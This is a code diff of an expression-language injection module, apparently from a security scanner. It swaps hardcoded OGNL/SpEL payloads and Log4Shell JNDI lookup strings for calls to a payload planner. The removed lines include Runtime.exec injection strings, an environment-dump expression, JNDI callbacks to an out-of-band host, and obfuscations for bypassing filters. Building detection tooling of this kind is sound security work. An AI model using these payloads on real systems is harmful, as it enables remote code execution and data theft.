@@ -27,39 +27,17 @@ class ExpressionLanguage(Module):
         "and restrict outbound network egress from application servers."
     )
 
-    def _ognl_spel_payloads(self, marker: str) -> list[str]:
-        return [
-            # OGNL (Struts) — arithmetic sanity + echo
-            "%{" + marker + "}",
-            "%{7*7}",
-            "%{(#a=@java.lang.Runtime@getRuntime().exec('echo " + marker + "'))}",
-            "${{7*7}}",
-            # SpEL
-            "#{7*7}",
-            "#{T(java.lang.Runtime).getRuntime().exec('echo " + marker + "')}",
-            "${T(java.lang.System).getenv()}",
-        ]
-
-    def _jndi_payloads(self, host: str) -> list[str]:
-        schemes = ["ldap", "rmi", "dns", "ldaps"]
-        payloads = []
-        for scheme in schemes:
-            payloads.append("${jndi:" + f"{scheme}://{host}/a" + "}")
-        # Common obfuscations used to bypass naive filters — helps assess coverage.
-        payloads.append("${${lower:jndi}:${lower:ldap}://" + host + "/a}")
-        payloads.append("${${::-j}${::-n}${::-d}${::-i}:ldap://" + host + "/a}")
-        return payloads
-
     async def run(self, target: Target) -> None:
-        points = target.injection_points()
         # JNDI is frequently reachable via logged headers; include common ones.
-        for point in points:
+        for point in target.injection_points():
             await self._check_el(point)
             await self._check_jndi(point)
 
     async def _check_el(self, point) -> bool:
         marker = self.marker()
-        payloads = self._ognl_spel_payloads(marker)
+        # OGNL / SpEL / MVEL execution payloads planned from the corpus.
+        payloads = await self.plan(marker=marker, oracle="output",
+                                   context=f"OGNL/SpEL EL injection at {point.describe()}")
         # Arithmetic sanity (49) as a secondary evaluator signal.
         for payload in payloads:
             result = await self.s.probe(
@@ -87,7 +65,9 @@ class ExpressionLanguage(Module):
             return False
         token = self.s.oob.new_token("jndi")
         host = self.s.oob.callback_host(token)
-        for payload in self._jndi_payloads(host):
+        payloads = await self.plan(host=host, oracle="oob",
+                                   context="JNDI/Log4Shell lookup")
+        for payload in payloads:
             result = await self.s.probe(
                 point=point, payload=payload, marker="",
                 vuln_class=self.vuln_class, module=self.name,
